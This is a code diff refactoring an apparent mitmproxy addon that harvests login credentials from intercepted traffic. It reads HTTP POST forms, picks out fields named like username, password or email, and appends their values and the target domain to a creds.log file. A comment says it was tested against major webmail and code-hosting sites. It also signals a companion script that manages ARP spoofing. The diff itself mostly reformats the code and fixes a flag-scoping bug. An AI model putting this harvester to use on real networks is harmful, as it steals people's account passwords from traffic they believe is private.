@@ -1,12 +1,11 @@
-from mitmproxy import ctx, http
-from subprocess import check_output
 from os import system
+from subprocess import check_output
+
+from mitmproxy import ctx, http
 
 # tested against yahoo, outlook, gitlab, github, protonmail
 KEYWORDS = ["username", "password", "passwd", "login", "email"]
 
-# has re-arped flag
-arp_flag = False
 
 def filter_fields(fields: dict):
     result = []
@@ -21,37 +20,39 @@ def filter_fields(fields: dict):
 class LogCredentials:
     def __init__(self):
         self.log_path = "./creds.log"
-    
+        self.arp_flag = False
+
     def request(self, flow: http.HTTPFlow):
         method = flow.request.method
-        ctx.log.info(f'Received: {method}')
-        if not arp_flag:
+        ctx.log.info(f"Received: {method}")
+        if not self.arp_flag:
             # catch for if process does not exist
             try:
-                pid = check_output(["pgrep", "-f", "sudo python ftp_hook.py"]).strip().decode()
-                #pid = check_output(["pgrep", "-f", "sudo python3 ftp_hook.py"]).strip().decode()
+                pid = (
+                    check_output(["pgrep", "-f", "sudo python ftp_hook.py"])
+                    .strip()
+                    .decode()
+                )
+                # pid = check_output(["pgrep", "-f", "sudo python3 ftp_hook.py"]).strip().decode()
                 # ftp_hook to perform re-arp on SIGINT
-                system(f'kill -s INT {pid}') 
-                arp_flag = True
+                system(f"kill -s INT {pid}")
+                self.arp_flag = True
             except:
                 pass
 
-        if method == 'POST' and flow.request.urlencoded_form:
+        if method == "POST" and flow.request.urlencoded_form:
             body_data = flow.request.urlencoded_form
-            ctx.log.info(f'Logged form: {body_data}')
+            ctx.log.info(f"Logged form: {body_data}")
             potential_fields = filter_fields(body_data)
             if len(potential_fields) == 0:
                 return
             with open(self.log_path, "a") as f:
-                f.write('------Logged Creds------\n')
-                f.write(f'Domain: {flow.request.host}\n')
+                f.write("------Logged Creds------\n")
+                f.write(f"Domain: {flow.request.host}\n")
                 for field in potential_fields:
-                    ctx.log.info(f'POTENTIAL CREDS: {body_data[field]}')
-                    f.write(f'POTENTIAL CREDS: {body_data[field]}\n')
-                f.write('------End Entry------\n')
+                    ctx.log.info(f"POTENTIAL CREDS: {body_data[field]}")
+                    f.write(f"POTENTIAL CREDS: {body_data[field]}\n")
+                f.write("------End Entry------\n")
 
 
-
-addons = [
-    LogCredentials()
-]
+addons = [LogCredentials()]
